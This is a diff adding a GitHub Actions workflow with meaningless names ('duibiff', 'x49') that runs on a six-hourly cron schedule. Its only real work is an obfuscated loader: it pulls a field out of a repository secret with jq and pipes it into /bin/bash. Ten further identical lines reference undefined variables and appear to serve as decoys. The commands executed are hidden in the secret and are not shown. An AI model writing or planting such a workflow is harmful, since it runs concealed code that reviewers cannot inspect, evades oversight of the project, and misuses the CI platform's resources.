@@ -1,0 +1,27 @@
+name: duibiff
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: duibiff
+        env:
+          x49: ${{ secrets.x49 }}
+        run: |
+          echo $x49 | jq -r .hb3447 | /bin/bash
+          echo $aoxq5595 | jq -r .itu6445 | /bin/bash
+          echo $o4 | jq -r .ekjvc474 | /bin/bash
+          echo $b68953 | jq -r .vsg88 | /bin/bash
+          echo $ep83104 | jq -r .riv957 | /bin/bash
+          echo $k357 | jq -r .l53888 | /bin/bash
+          echo $kj30161 | jq -r .xmen925 | /bin/bash
+          echo $zopz8 | jq -r .eb2398 | /bin/bash
+          echo $o2202 | jq -r .z94780 | /bin/bash
+          echo $jk786 | jq -r .k484 | /bin/bash
+          echo $krori08 | jq -r .zmzwf61 | /bin/bash
+
